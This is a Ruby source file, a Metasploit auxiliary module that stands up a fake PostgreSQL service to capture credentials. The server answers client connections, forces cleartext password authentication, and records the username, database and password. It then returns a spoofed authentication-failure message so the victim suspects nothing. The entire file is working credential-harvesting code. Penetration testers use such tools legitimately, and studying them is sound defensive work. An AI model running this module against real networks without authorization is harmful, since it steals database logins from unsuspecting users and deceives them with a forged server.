##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'Authentication Capture: PostgreSQL',
            'Description'    => %q{
              This module provides a fake PostgreSQL service that is designed to
              capture clear-text authentication credentials.
            },
            'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
            'License'        => MSF_LICENSE,
            'Actions'        => [ [ 'Capture' ] ],
            'PassiveActions' => [ 'Capture' ],
            'DefaultAction'  => 'Capture'
        )
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ]),
      ], self.class)
  end

  # This module is based on MySQL capture module by Patrik Karlsson.
  # Reference: http://www.postgresql.org/docs/9.2/static/protocol-message-formats.html

  def setup
    super
    @state = {}
  end

  def run
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {
      :name    => "#{c.peerhost}:#{c.peerport}",
      :ip      => c.peerhost,
      :port    => c.peerport,
    }
    @state[c]["status"] = :init
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    length = data.slice(0, 4).unpack("N")[0]
    if length == 8 and @state[c]["status"] == :init
      # SSL request
      c.put 'N'
      @state[c]["status"] = :send_auth_type
    elsif @state[c]["status"] == :send_auth_type
      # Startup message
      data.slice!(0, 4).unpack("N")[0] # skip over length
      data.slice!(0, 4).unpack("N")[0] # skip over protocol
      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack("C*")
      c.put sdata
      data.slice!(0, 5) # skip over "user\x00"
      @state[c][:username] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      data.slice!(0, 9) # skip over "database\x00"
      @state[c][:database] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      @state[c]["status"] = :pwn
    elsif @state[c]["status"] == :pwn and data[0] == 'p'
      # Password message
      data.slice!(0, 5).unpack("N")[0] # skip over length
      @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      report_auth_info(
        :host  => c.peerhost,
        :port => datastore['SRVPORT'],
        :sname => 'psql_client',
        :user => @state[c][:username],
        :pass => @state[c][:password],
        :type => "PostgreSQL credentials",
        :proof => @state[c][:database],
        :source_type => "captured",
        :active => true
      )
      print_status("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
      # send failure message
      sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack("CN")
      sdata << "SFATAL"
      sdata << "\x00"
      sdata << "C28P01"
      sdata << "\x00"
      sdata << "Mpassword authentication failed for user \"#{@state[c][:username]}\""
      sdata << "\x00"
      sdata << "Fauth.c"
      sdata << "\x00"
      sdata << "L302"
      sdata << "\x00"
      sdata << "Rauth_failed"
      sdata << "\x00\x00"
      c.put sdata
      c.close
    end

  end

  def on_client_close(c)
    @state.delete(c)
  end
end
